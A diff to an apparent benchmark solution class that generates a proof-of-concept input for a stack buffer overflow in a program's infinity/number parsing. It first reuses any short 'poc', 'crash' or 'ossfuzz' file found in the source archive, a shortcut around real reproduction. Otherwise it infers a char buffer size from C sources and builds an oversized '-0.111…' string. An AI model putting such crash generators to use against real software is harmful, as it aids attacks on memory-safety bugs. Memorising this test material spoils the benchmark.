@@ -1,136 +1,131 @@
 import os
 import re
 import tarfile
-import zipfile
-from typing import Iterable, Optional
+from typing import Iterable, Optional, Tuple
 
 
 class Solution:
-    def _iter_files_dir(self, root: str) -> Iterable[str]:
-        for base, _, files in os.walk(root):
-            for fn in files:
-                yield os.path.join(base, fn)
+    def solve(self, src_path: str) -> bytes:
+        poc = self._try_find_existing_poc(src_path)
+        if poc is not None:
+            return poc
 
-    def _looks_text_source(self, name: str) -> bool:
-        name_l = name.lower()
-        exts = (
-            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
-            ".inc", ".ipp", ".inl", ".l", ".y", ".py", ".java", ".rs", ".go"
-        )
-        if name_l.endswith(exts):
-            return True
-        # Also include common build/config files which might mention Infinity
-        base = os.path.basename(name_l)
-        return base in (
-            "cmakelists.txt", "configure.ac", "configure.in", "makefile", "makefile.am",
-            "meson.build", "build.gradle", "pom.xml"
-        )
+        buf_size = self._infer_relevant_stack_buffer_size(src_path)
+        if buf_size is None:
+            buf_size = 16
 
-    def _scan_bytes_for_hints(self, blob: bytes) -> tuple[bool, bool, bool]:
-        # returns (has_infinity, has_dot_inf, has_strtod_like)
-        b = blob
-        has_infinity = (b"Infinity" in b) or (b"infinity" in b)
-        has_dot_inf = (b".inf" in b.lower()) or (b"inff" in b.lower())
-        has_strtod_like = (b"strtod" in b) or (b"strtof" in b) or (b"atof" in b)
-        return has_infinity, has_dot_inf, has_strtod_like
+        if buf_size < 2:
+            return b"-1"
+        if buf_size == 2:
+            return b"-0"
+        if buf_size == 3:
+            return b"-0."
+        return b"-0." + (b"1" * (buf_size - 3))
 
-    def _scan_archive(self, path: str) -> tuple[bool, bool, bool]:
-        has_infinity = False
-        has_dot_inf = False
-        has_strtod_like = False
-
-        def update(flags: tuple[bool, bool, bool]) -> None:
-            nonlocal has_infinity, has_dot_inf, has_strtod_like
-            hi, hdi, hs = flags
-            has_infinity = has_infinity or hi
-            has_dot_inf = has_dot_inf or hdi
-            has_strtod_like = has_strtod_like or hs
-
-        if os.path.isdir(path):
-            scanned = 0
-            for fp in self._iter_files_dir(path):
-                if not self._looks_text_source(fp):
-                    continue
-                try:
-                    st = os.stat(fp)
-                    if st.st_size <= 0 or st.st_size > 2_000_000:
+    def _iter_files_from_src(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
+        if os.path.isdir(src_path):
+            for root, _, files in os.walk(src_path):
+                for fn in files:
+                    p = os.path.join(root, fn)
+                    try:
+                        with open(p, "rb") as f:
+                            yield p, f.read()
+                    except Exception:
                         continue
-                    with open(fp, "rb") as f:
-                        blob = f.read(256_000)
-                    update(self._scan_bytes_for_hints(blob))
-                    scanned += 1
-                    if scanned >= 2000:
-                        break
-                    if has_infinity and has_strtod_like:
-                        break
-                except OSError:
-                    continue
-            return has_infinity, has_dot_inf, has_strtod_like
+            return
 
-        lower = path.lower()
-        if tarfile.is_tarfile(path):
-            try:
-                with tarfile.open(path, "r:*") as tf:
-                    scanned = 0
-                    for m in tf:
+        try:
+            if tarfile.is_tarfile(src_path):
+                with tarfile.open(src_path, "r:*") as tf:
+                    for m in tf.getmembers():
                         if not m.isreg():
-                            continue
-                        if not self._looks_text_source(m.name):
-                            continue
-                        if m.size <= 0 or m.size > 2_000_000:
                             continue
                         try:
                             f = tf.extractfile(m)
                             if f is None:
                                 continue
-                            blob = f.read(256_000)
+                            data = f.read()
                         except Exception:
                             continue
-                        update(self._scan_bytes_for_hints(blob))
-                        scanned += 1
-                        if scanned >= 3000:
-                            break
-                        if has_infinity and has_strtod_like:
-                            break
-            except Exception:
-                pass
-            return has_infinity, has_dot_inf, has_strtod_like
+                        yield m.name, data
+        except Exception:
+            return
 
-        if lower.endswith(".zip") and zipfile.is_zipfile(path):
+    def _try_find_existing_poc(self, src_path: str) -> Optional[bytes]:
+        name_keywords = ("poc", "crash", "repro", "overflow", "stack", "asan", "issue", "ossfuzz", "fuzz")
+        best = None  # (score, len, data)
+        for name, data in self._iter_files_from_src(src_path):
+            ln = len(data)
+            if ln == 0 or ln > 512:
+                continue
+            lname = name.lower()
+            if not any(k in lname for k in name_keywords):
+                continue
+
+            score = 0
+            if ln == 16:
+                score += 50
+            if data[:1] == b"-":
+                score += 8
+            low = data.lower()
+            if b"inf" in low or b"infinity" in low:
+                score += 10
+            if b"nan" in low:
+                score += 5
+
+            printable = sum(1 for b in data if 9 <= b <= 13 or 32 <= b <= 126)
+            if printable / max(1, ln) > 0.85:
+                score += 3
+
+            if best is None or (score, -ln) > (best[0], -best[1]):
+                best = (score, ln, data)
+
+        if best is not None and best[0] >= 10:
+            return best[2]
+        return None
+
+    def _infer_relevant_stack_buffer_size(self, src_path: str) -> Optional[int]:
+        c_exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".ipp")
+        re_char_arr = re.compile(r"\bchar\s+[A-Za-z_]\w*\s*\[\s*(\d+)\s*\]")
+        re_std_array = re.compile(r"\bstd::array\s*<\s*char\s*,\s*(\d+)\s*>")
+        re_inf = re.compile(r"\b(infinity|inf|nan)\b", re.IGNORECASE)
+
+        candidates = []
+        for name, data in self._iter_files_from_src(src_path):
+            if not name.lower().endswith(c_exts):
+                continue
+            if len(data) > 2_000_000:
+                continue
             try:
-                with zipfile.ZipFile(path, "r") as zf:
-                    scanned = 0
-                    for zi in zf.infolist():
-                        if zi.is_dir():
-                            continue
-                        if not self._looks_text_source(zi.filename):
-                            continue
-                        if zi.file_size <= 0 or zi.file_size > 2_000_000:
-                            continue
-                        try:
-                            with zf.open(zi, "r") as f:
-                                blob = f.read(256_000)
-                        except Exception:
-                            continue
-                        update(self._scan_bytes_for_hints(blob))
-                        scanned += 1
-                        if scanned >= 3000:
-                            break
-                        if has_infinity and has_strtod_like:
-                            break
+                text = data.decode("utf-8", errors="ignore")
             except Exception:
-                pass
-            return has_infinity, has_dot_inf, has_strtod_like
+                continue
 
-        return has_infinity, has_dot_inf, has_strtod_like
+            if not re_inf.search(text):
+                continue
 
-    def solve(self, src_path: str) -> bytes:
-        has_infinity, has_dot_inf, has_strtod_like = self._scan_archive(src_path)
+            for m in re_char_arr.finditer(text):
+                try:
+                    n = int(m.group(1))
+                except Exception:
+                    continue
+                if 4 <= n <= 256:
+                    candidates.append(n)
 
-        # Heuristic PoC (16 bytes) targeting a bug where '-' is consumed during Infinity parsing
-        # even when the value is not Infinity, leading to unsafe buffer handling.
-        # Use a float-like token to encourage float parsing paths.
-        if has_dot_inf and not has_strtod_like and not has_infinity:
-            # Some projects (e.g., YAML-like) treat ".inf" specially; still use a normal float.
-            return b"-.99999999999999"  # 16 bytes
-        return b"-9.9999999999999"  # 16 bytes
+            for m in re_std_array.finditer(text):
+                try:
+                    n = int(m.group(1))
+                except Exception:
+                    continue
+                if 4 <= n <= 256:
+                    candidates.append(n)
+
+        if not candidates:
+            return None
+        if 16 in candidates:
+            return 16
+        candidates = sorted(set(candidates))
+        for n in candidates:
+            if 8 <= n <= 64:
+                return n
+        return candidates[0] if candidates else None
